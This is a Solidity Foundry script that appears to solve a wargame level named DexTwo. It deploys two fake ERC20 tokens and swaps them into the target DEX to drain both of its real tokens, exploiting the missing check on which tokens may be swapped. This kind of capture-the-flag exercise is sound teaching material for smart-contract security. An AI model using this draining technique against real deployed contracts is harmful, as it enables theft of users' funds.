// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level23.sol";
import "forge-std/Script.sol";

contract ExploitLevel23 is Script {
    DexTwo instance = DexTwo(0x808FD0D3193559D39E4d31B5656a19791A3C7707);
    address token1 = instance.token1();
    address token2 = instance.token2();

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        FakeToken fake1 = new FakeToken();
        fake1.transfer(address(instance), 1);
        FakeToken fake2 = new FakeToken();
        fake2.transfer(address(instance), 1);

        fake1.approve(address(instance), 1);
        instance.swap(address(fake1), token1, 1);
        fake2.approve(address(instance), 1);
        instance.swap(address(fake2), token2, 1);

        vm.stopBroadcast();
    }
}

contract FakeToken is ERC20 {
    constructor() ERC20("Fake Token", "FAKE") {
        _mint(msg.sender, 100);
    }
}
